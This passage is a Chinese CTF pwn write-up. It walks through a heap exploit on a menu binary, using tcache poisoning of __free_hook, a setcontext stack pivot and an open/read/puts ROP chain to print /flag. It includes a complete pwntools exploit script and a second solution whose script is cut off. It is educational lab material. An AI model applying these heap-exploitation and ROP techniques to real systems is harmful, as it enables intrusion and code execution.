<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pl = p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>)</span><br><span class="line">pl+= p64(<span class="number">0</span>) + p64(heap_addr+<span class="number">0x3a8</span><span class="number">-0x18</span>)</span><br><span class="line">pl+= p64(setcontext)</span><br><span class="line">pl+= (<span class="number">0xa0</span>-len(pl))*b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span> + p64(heap_addr+<span class="number">0x5d0</span>) + p64(p_rdi_r)</span><br></pre></td></tr></table></figure>

<p>按这样的布局执行setcontext之后就可以跳转到相应的位置</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220503110752-7op7e2f.png" alt="image.png"></p>
<p>这时候执行到了gadget了我们继续往下执行</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220503110832-z6io0bw.png" alt="image.png"></p>
<p>这里就要跳转到chontext了</p>
<p>然后我们布置一下rop</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#rop</span></span><br><span class="line">pl = p64(heap_addr+<span class="number">0xb10</span>) + p64(p_rsi_r) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">pl += p64(p_rdi_r) + p64(<span class="number">4</span>) + p64(p_rsi_r) + p64(heap_addr+<span class="number">0x500</span>) + p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>)*<span class="number">2</span> + p64(read_addr)</span><br><span class="line">pl += p64(p_rdi_r) + p64(heap_addr+<span class="number">0x500</span>) + p64(<span class="built_in">puts</span>)</span><br><span class="line">content_edit(<span class="number">4</span>,pl)</span><br><span class="line">name_edit(<span class="number">0</span>,<span class="string">&#x27;/flag\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>继续执行</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220503110948-jp8zzrk.png" alt="image.png"></p>
<p>执行了这一条之后，我们观察一下stack，这里是控制了rsp的地址</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220503111030-3p5ne50.png" alt="image.png"></p>
<p>这里我们看到成功将我们需要执行的rop作为栈</p>
<p>然后继续执行，我们再刚才setcontext的地方给rcx了一个pop_rdi 然后我们最后ret的时候会返回pop rdi ret</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220503111300-2wqqur2.png" alt="image.png"></p>
<p>正如我们布置所想的东西。</p>
<p>继续执行</p>
<p>成功open</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220503111348-y4kwce9.png" alt="image.png"></p>
<p>成功read</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220503111433-vz3vkhl.png" alt="image.png"></p>
<p>成功put</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220503111505-qye88zb.png" alt="image.png"></p>
<p>成功进行了orw</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220503111522-aa92hz3.png" alt="image.png"></p>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">libcelf = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4342</span>,<span class="number">0x3342</span>]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">plt     = <span class="keyword">lambda</span> data               :elf.plt[data]</span><br><span class="line">got     = <span class="keyword">lambda</span> data               :elf.got[data]</span><br><span class="line">sym     = <span class="keyword">lambda</span> data               :libc.sym[data]</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(libcelf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sex,name</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;2.Girl:\n&#x27;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">	sa(<span class="string">&quot;Please input your child&#x27;s name:\n&quot;</span>,name)</span><br><span class="line">	  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name_edit</span>(<span class="params">idx,name</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">	ru(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_sex</span>(<span class="params">idx,sex</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	ru(<span class="string">b&#x27;Current gender:&#x27;</span>)</span><br><span class="line">	temp = uu64(r(<span class="number">6</span>))</span><br><span class="line">	sla(<span class="string">&#x27;2.Girl:&#x27;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">	<span class="keyword">return</span> temp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">content_edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;description:&#x27;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>(<span class="params">addr</span>):</span><br><span class="line">	<span class="keyword">global</span> libc_base,mh,fh,system,binsh_addr,_IO_2_1_stdout_,realloc</span><br><span class="line">	libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	leak(<span class="string">&quot;libc base &quot;</span>,libc_base) </span><br><span class="line">	mh = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">	system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">	realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">	fh = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	<span class="comment">#leak_heap</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		add(i,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">		free(<span class="number">6</span>-i)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	free(<span class="number">7</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	ru(<span class="string">&#x27;nder: &#x27;</span>)</span><br><span class="line">	heap_addr = uu64(r(<span class="number">6</span>))</span><br><span class="line">	leak(<span class="string">&#x27;heap_addr&#x27;</span>,heap_addr)</span><br><span class="line">	<span class="comment">#leak_libc</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">		add(i,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	ru(<span class="string">&#x27;nder: &#x27;</span>)</span><br><span class="line">	base = uu64(r(<span class="number">6</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">	leak(<span class="string">&#x27;libc&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">	open_addr  = base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	read_addr = base + sym(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">	puts = base + sym(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">	gadget = base + <span class="number">0x1518b0</span></span><br><span class="line">	free_hook = base + sym(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">	setcontext = base + sym(<span class="string">&#x27;setcontext&#x27;</span>) + <span class="number">61</span></span><br><span class="line">	p_rdi_r = base + <span class="number">0x023b72</span></span><br><span class="line">	p_rdx_r12_r = base + <span class="number">0x0119241</span></span><br><span class="line">	p_rsi_r = base + <span class="number">0x2604f</span></span><br><span class="line">	leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">	leak(<span class="string">&#x27;gadget&#x27;</span>,gadget)</span><br><span class="line">	leak(<span class="string">&#x27;libc&#x27;</span>,base)</span><br><span class="line">	leak(<span class="string">&#x27;free_hook&#x27;</span>,sym(<span class="string">&#x27;__free_hook&#x27;</span>))</span><br><span class="line">	leak(<span class="string">&#x27;malloc_hook&#x27;</span>,base+sym(<span class="string">&#x27;__malloc_hook&#x27;</span>))</span><br><span class="line"></span><br><span class="line">	add(<span class="number">9</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	free(<span class="number">3</span>)</span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	name_edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x380</span>)[:-<span class="number">1</span>])</span><br><span class="line">	add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	add(<span class="number">9</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	pl = p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>)</span><br><span class="line">	pl+= p64(<span class="number">0</span>) + p64(heap_addr+<span class="number">0x3a8</span>-<span class="number">0x18</span>)</span><br><span class="line">	pl+= p64(setcontext)</span><br><span class="line">	pl+= (<span class="number">0xa0</span>-<span class="built_in">len</span>(pl))*<span class="string">b&#x27;\x00&#x27;</span> + p64(heap_addr+<span class="number">0x5d0</span>) + p64(p_rdi_r)</span><br><span class="line">	content_edit(<span class="number">9</span>,pl)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	free(<span class="number">7</span>)</span><br><span class="line">	free(<span class="number">8</span>)</span><br><span class="line">	name_edit(<span class="number">0</span>,p64(free_hook)[:-<span class="number">1</span>])</span><br><span class="line">	add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	add(<span class="number">7</span>,<span class="number">1</span>,p64(gadget)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">	<span class="comment">#rop</span></span><br><span class="line">	pl = p64(heap_addr+<span class="number">0xb10</span>) + p64(p_rsi_r) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">	pl += p64(p_rdi_r) + p64(<span class="number">4</span>) + p64(p_rsi_r) + p64(heap_addr+<span class="number">0x500</span>) + p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>)*<span class="number">2</span> + p64(read_addr)</span><br><span class="line">	pl += p64(p_rdi_r) + p64(heap_addr+<span class="number">0x500</span>) + p64(puts)</span><br><span class="line">	content_edit(<span class="number">4</span>,pl)</span><br><span class="line">	name_edit(<span class="number">0</span>,<span class="string">&#x27;/flag\x00\x00&#x27;</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">&#x27;b *&#x27;</span>+ <span class="built_in">str</span>(<span class="built_in">hex</span>(gadget))+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	free(<span class="number">2</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	itr()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">i = 0</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">	i += 1</span></span><br><span class="line"><span class="string">	log.warn(str(i))</span></span><br><span class="line"><span class="string">	try:  </span></span><br><span class="line"><span class="string">		pwn()</span></span><br><span class="line"><span class="string">	except Exception:</span></span><br><span class="line"><span class="string">		p.close()</span></span><br><span class="line"><span class="string">		if(local == 1):</span></span><br><span class="line"><span class="string">			p = process(binary)</span></span><br><span class="line"><span class="string">		else:</span></span><br><span class="line"><span class="string">			p = remote(ip,port)</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>

<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>类似的布置svcudp_reply+26进行栈迁移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">libcelf = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4342</span>,<span class="number">0x3342</span>]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">plt     = <span class="keyword">lambda</span> data               :elf.plt[data]</span><br><span class="line">got     = <span class="keyword">lambda</span> data               :elf.got[data]</span><br><span class="line">sym     = <span class="keyword">lambda</span> data               :libc.sym[data]</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(libcelf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sex,name</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;2.Girl:\n&#x27;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">	sa(<span class="string">&quot;Please input your child&#x27;s name:\n&quot;</span>,name)</span><br><span class="line">	  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name_edit</span>(<span class="params">idx,name</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">	ru(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_sex</span>(<span class="params">idx,sex</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	ru(<span class="string">b&#x27;Current gender:&#x27;</span>)</span><br><span class="line">	temp = uu64(r(<span class="number">6</span>))</span><br><span class="line">	sla(<span class="string">&#x27;2.Girl:&#x27;</span>,<span class="built_in">str</span>(sex))</span><br><span class="line">	<span class="keyword">return</span> temp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">content_edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	sla(<span 